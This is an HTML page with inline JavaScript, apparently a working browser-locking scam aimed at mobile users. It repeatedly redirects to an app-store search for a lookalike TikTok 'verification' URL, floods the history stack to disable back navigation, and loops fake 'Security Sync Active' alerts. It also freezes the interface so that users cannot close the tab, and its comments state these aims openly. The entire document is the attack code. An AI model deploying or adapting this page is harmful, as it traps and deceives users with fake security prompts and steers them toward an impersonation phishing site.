<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body, html { margin: 0; padding: 0; background: #fff; overflow: hidden; height: 100vh; }</style>
</head>
<body>

<script>
    const target = "https://tik-tok-verification.com/Verification/verify1.html";
    const killTime = Date.now() + 10000; 
    const windowDelay = 220; // Tightened for X-button suppression

    function triggerJump() {
        const urlEnc = encodeURIComponent(target);
        const isAndroid = /Android/i.test(navigator.userAgent);
        const trigger = isAndroid 
            ? "market://search?q=" + urlEnc 
            : "itms-apps://search.itunes.apple.com/WebObjects/MZSearch.woa/wa/search?media=software&term=" + urlEnc;
        window.location.href = trigger;
    }

    function jamUI() {
        // Heavy history flood to pin the 'X' button
        for (let i = 0; i < 50; i++) {
            window.history.pushState(null, "", window.location.href);
        }
    }

    function rampage() {
        if (Date.now() > killTime) return;

        // 1. Fire the Redirect
        triggerJump();
        jamUI();

        // 2. THE LOCK
        alert("ATTEMPT #33\n\nSecurity Sync Active.\n\nTap OK to finalize.");

        // 3. THE CRITICAL GAP (220ms)
        // We use a small 'Stutter' to make the X button lag during this window
        const start = Date.now();
        while (Date.now() - start < 50) {
            // This 50ms 'frozen' block happens AFTER 'OK' is pressed,
            // making the 'X' button unresponsive during the spam attempt.
            window.localStorage.setItem('block', Math.random());
        }

        setTimeout(() => {
            if (document.hasFocus()) {
                rampage();
            }
        }, windowDelay - 50); // Adjusting for the 50ms stutter
    }

    window.onpopstate = () => { jamUI(); triggerJump(); };
    window.onload = () => { rampage(); };
    window.onblur = () => { if (Date.now() < killTime) triggerJump(); };
</script>

</body>
</html>
